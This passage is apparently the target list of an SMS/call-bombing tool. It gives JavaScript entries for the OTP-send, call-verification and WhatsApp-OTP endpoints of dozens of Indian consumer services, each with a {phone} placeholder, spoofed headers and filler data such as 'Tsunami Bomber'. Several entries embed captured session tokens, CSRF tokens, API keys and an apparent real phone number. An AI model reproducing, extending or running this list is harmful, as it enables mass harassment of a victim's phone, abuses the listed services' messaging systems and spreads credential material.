    { name: "RealEstateIndia_Call", url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php", method: "POST", headers: { "x-requested-with": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" } },
    { name: "MagicBricks_Call", url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", method: "GET", headers: {} },
    { name: "Career360_Call", url: "https://www.careers360.com/ajax/no-cache/user/otp-send", method: "POST", headers: { "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" } },
    { name: "MamaEarth_WA", url: "https://auth.mamaearth.in/v1/auth/initiate-signup", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Havells_WA", url: "https://havells.com/otplogin/account/otploginpost/", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" } },
    { name: "HeroFinCorp_WA", url: "https://loans.apps.herofincorp.com/api/generateOtp", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true }) },
    { name: "SalaryBolt_New", url: "https://backend.salarybolt.com/api/user/send-otp", method: "POST", headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "origin": "https://salarybolt.com", "referer": "https://salarybolt.com/" }, data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone }), rateLimit: true },

    // ============================================================
    // 🔥 6 NAYI WORKING APIs
    // ============================================================
    { name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login", method: "POST", headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" }, data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" }) },
    { name: "Cashify", url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}", method: "GET", headers: { "user-agent": "okhttp/3.9.1" } },
    { name: "Tradgo", url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp", method: "POST", headers: { "Content-Type": "application/json", "User-Agent": "okhttp/3.9.1" }, data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Gapoon", url: "https://www.gapoon.com/userSignup", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=LexLuthor" } },
    { name: "AllenSolly", url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: { "_raw": "mobileoremail={phone}&name=markluther" } },
    { name: "Jockey_WhatsApp", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", method: "GET", headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" } },

    // ============================================================
    // 🎯 ADDITIONAL APIS
    // ============================================================
    { name: "Hungama_Verified", url: "https://communication.api.hungama.com/v1/communication/otp", method: "POST", headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "identifier": "home", "mlang": "en", "country_code": "IN", "origin": "https://www.hungama.com", "referer": "https://www.hungama.com/" }, data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 }) },
    { name: "NoBroker_Verified", url: "https://www.nobroker.in/api/v3/account/otp/send", method: "POST", headers: { "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.nobroker.in", "referer": "https://www.nobroker.in/" }, data: { "_raw": "phone={phone}&countryCode=IN" } },
    { name: "TataCapital_Verified", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", method: "POST", headers: { "Content-Type": "application/json" }, data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" }) },
    { name: "Swiggy_Verified", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", headers: { "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8" }, data: (phone) => JSON.stringify({ mobile: phone }) },
    { name: "Servetel_Verified", url: "https://api.servetel.in/v1/auth/otp", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)" }, data: { "_raw": "mobile_number={phone}" } },
    { name: "KPNFresh_Verified", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", method: "POST", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" }, data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } }) },

    // ============================================================
    // 🎯 HOTSTAR / OTT APIs
    // ============================================================
    { name: "Hotstar_1", method: "PUT", url: "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", headers: { "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "x-hs-platform": "PCTV", "x-country-code": "IN", "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d", "x-hs-appversion": "5.0.40", "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "accept": "*/*", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/in/subscribe/sign-in", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phone_number": "{phone}", "country_prefix": "91" } },
    { name: "AltBalaji_1", method: "POST", url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", headers: { "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE", "Content-Type": "application/json", "Origin": "https://www.altbalaji.com", "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phone_number": "{phone}", "country_code": "91", "platform": "web", "exp": 1601043289127 } },
    { name: "Voot_1", method: "POST", url: "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "origin": "https://www.voot.com", "referer": "https://www.voot.com/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "type": "mobile", "mobile": "{phone}", "countryCode": "+91" } },
    { name: "SonyLIV_1", method: "POST", url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", headers: { "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120", "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "application/json, text/plain, */*", "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256", "x-via-device": "true", "app_version": "3.1.20", "origin": "https://www.sonyliv.com", "referer": "https://www.sonyliv.com", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "channelPartnerID": "MSMIND", "mobileNumber": "{phone}", "country": "IN", "timestamp": "2020-09-24T14:03:03.505Z" } },
    { name: "MedPlus", method: "POST", url: "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", headers: { "accept": "application/json, text/plain, */*", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.medplusmart.com", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false" } },
    { name: "FBBOnline", method: "POST", url: "https://www.fbbonline.in/customer/account/GenerateOtp", headers: { "accept": "application/json, text/javascript, */*; q=0.01", "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=", "x-requested-with": "XMLHttpRequest", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.fbbonline.in", "referer": "https://www.fbbonline.in/customer/account/create", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" } },
    { name: "Grofers", method: "POST", url: "https://grofers.com/v2/accounts/", headers: { "lon": "77.040489", "device_id": "a11f656b-422e-4617-953b-c350d517467d", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13", "app_client": "consumer_web", "lat": "28.4465616", "content-type": "application/x-www-form-urlencoded", "save-data": "on", "accept": "*/*", "origin": "https://grofers.com", "referer": "https://grofers.com/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "user_phone={phone}" } },
    { name: "Zomato_1", method: "POST", url: "https://www.zomato.com/webroutes/auth/login", headers: { "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.zomato.com", "referer": "https://www.zomato.com/kanpur", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" } },
    { name: "Cuemath_1", method: "POST", url: "https://www.cuemath.com/api/v4/parents/", headers: { "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/JSON", "Accept": "*/*", "Origin": "https://www.cuemath.com", "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "intl_mobile": { "phone": "" }, "phone": "{phone}", "email": "nsbd@dn.djs", "full_name": "hdhdhdg", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id" } },
    { name: "Dream11_1", method: "POST", url: "https://www.dream11.com/graphql/mutation/pwa/register", headers: { "accept": "*/*", "device": "pwa", "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://www.dream11.com", "referer": "https://www.dream11.com/register?ru=", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" } } },
    { name: "Doubtnut", method: "POST", url: "https://doubtnut.com/api/v1/user/login", headers: { "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://doubtnut.com", "referer": "https://doubtnut.com/login", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "phone={phone}" } },
    { name: "Byjus", method: "POST", url: "https://bcas-prod.byjusweb.com/api/send-otp", headers: { "accept": "*/*", "origin": "https://byjus.com", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded", "referer": "https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE", "accept-encoding": "gzip, deflate", "accept-language": "en-US" }, data: { "_raw": "phoneNumber={phone}&page=free-trial-classes" } },
    { name: "Careers360", method: "POST", url: "https://www.careers360.com/ajax/no-cache/user/otp-send", headers: { "Accept": "*/*", "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.careers360.com", "Referer": "https://www.careers360.com/user/otp-verify/101e8d6e591af6688f640eee08f5a5f8?destination=&click_location=header&google_success=header", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" } },
    { name: "Coolwinks", method: "GET", url: "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}", headers: { "Accept": "*/*", "x-user-agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 CWUA/msite/0/", "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Origin": "https://www.coolwinks.com", "Referer": "https://www.coolwinks.com/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" } },
    { name: "Cansell", method: "POST", url: "https://webapi.cansell.in/api/User/SignUp", headers: { "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.cansell.in", "Referer": "https://m.cansell.in/register", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "name": "Uwusjsj", "surname": "wjeshs", "email": "hsjs@gmail.com", "phone": "{phone}", "password": "eeeeee" } },
    { name: "Gaana", method: "POST", url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile", headers: { "appVersion": "8.9.0", "CONTENT_TYPE": "application/json", "channel": "gaana.com", "tgid": "j9qcq0z2ur4llq2a58qqmag2", "sdkVersion": "1.0", "appVersionCode": "933", "deviceId": "j9qcq0z2ur4llq2a58qqmag2", "platform": "android", "sdkVersionCode": "1", "Content-Type": "application/json; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)", "Connection": "Keep-Alive", "Accept-Encoding": "gzip" }, data: { "mobile": "91-{phone}" } },
    { name: "Paytm", method: "POST", url: "https://accounts.paytm.com/v2/api/register", headers: { "Accept": "application/json, text/plain, */*", "Origin": "https://accounts.paytm.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "Content-Type": "application/json", "Referer": "https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US" }, data: { "email": "", "mobile": "{phone}", "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "redirectUri": "https://paytm.com/v1/api/authresponse", "clientId": "paytm-web-secure", "scope": "paytm", "state": "", "responseType": "code", "theme": "mp-html5", "dob_agreement": true } },
    { name: "Limeroad", method: "POST", url: "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=", headers: { "origin": "https://www.limeroad.com", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "referer": "https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men", "accept-encoding": "gzip, deflate", "accept-language": "en-US" }, data: { "_raw": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={phone}" } },
    { name: "Cilory", method: "POST", url: "https://www.cilory.com/app/w/auth/soft", headers: { "accept": "application/json", "origin": "https://www.cilory.com", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json;charset=UTF-8", "referer": "https://www.cilory.com/authentication?back=%2Fmy-account", "accept-encoding": "gzip, deflate", "accept-language": "en-US" }, data: { "mobile": "{phone}" } },
    { name: "Ajio_1", method: "POST", url: "https://login.web.ajio.com/api/auth/accountCheck", headers: { "accept": "application/json", "Origin": "https://www.ajio.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Referer": "https://www.ajio.com/signup?referrer=/my-account/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US" }, data: { "emailId": "tsunami@gmail.com" } },
    { name: "Ajio_2", method: "POST", url: "https://login.web.ajio.com/api/auth/signupSendOTP", headers: { "accept": "application/json", "Origin": "https://www.ajio.com", "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json", "Referer": "https://www.ajio.com/signup?referrer=/my-account/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US" }, data: { "firstName": "Tsunami Bomber", "login": "tsunami@gmail.com", "password": "kd34646@3131nxnxn", "genderType": "", "mobileNumber": "{phone}", "requestType": "SENDOTP" } },
    { name: "BookMyShow_1", method: "POST", url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send", headers: { "accept": "application/json", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://in.bookmyshow.com", "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber=9519874704&email=&source=web", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "channel": "phone", "subChannel": "sms", "details": { "phone": "{phone}", "origin": "https://in.bookmyshow.com" } } },
    { name: "BigBasket", method: "POST", url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", headers: { "accept": "application/json", "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "x-channel": "BB-PWA", "content-type": "application/json", "origin": "https://www.bigbasket.com", "referer": "https://www.bigbasket.com/auth/login/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "identifier": "{phone}" } },
    { name: "FloMattress", method: "POST", url: "https://cod.flomattress.com/api/otp", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.flomattress.com", "Referer": "https://www.flomattress.com/account/register", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "number={phone}&store=hushbedding.myshopify.com" } },
    { name: "Banggood", method: "POST", url: "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api", headers: { "accept": "application/json", "x-requested-with": "XMLHttpRequest", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "origin": "https://m.banggood.in", "referer": "https://m.banggood.in/login.html", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "mobilePhone={phone}&countryPhoneCode=91&type=1&verifyCode=KmUu" } },
    { name: "Lenskart_1", method: "POST", url: "https://api.lenskart.com/v2/customers/sendOtp", headers: { "origin": "https://www.lenskart.com", "x-b3-traceid": "991600776345288", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/json;charset=UTF-8", "accept": "application/json, text/plain, */*", "cache-control": "no-cache, no-store", "x-session-token": "3bcac6f3-bda5-4370-8dc1-eebd8274b399", "x-api-client": "mobilesite", "referer": "https://www.lenskart.com/customer/account/login", "accept-encoding": "gzip, deflate", "accept-language": "en-US" }, data: { "telephone": "{phone}" } },
    { name: "UrbanClap", method: "POST", url: "https://www.urbanclap.com/api/v2/growth/profile/generateOTP", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "accept": "application/json, text/plain, */*", "cache-control": "no-cache", "x-device-os": "web", "x-version-name": "web_v4.137.2", "save-data": "on", "x-client-key": "f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6", "x-device-id": "ucuf1348-a14e179422-8c71-b87f-9eb1-edeca1376e-1600777338230", "x-version-code": "4.137.2", "origin": "https://www.urbancompany.com", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "country_id": "IND", "phone": { "isd_code": "+91", "phone_wo_isd": "{phone}" }, "device_type": "customer" } },
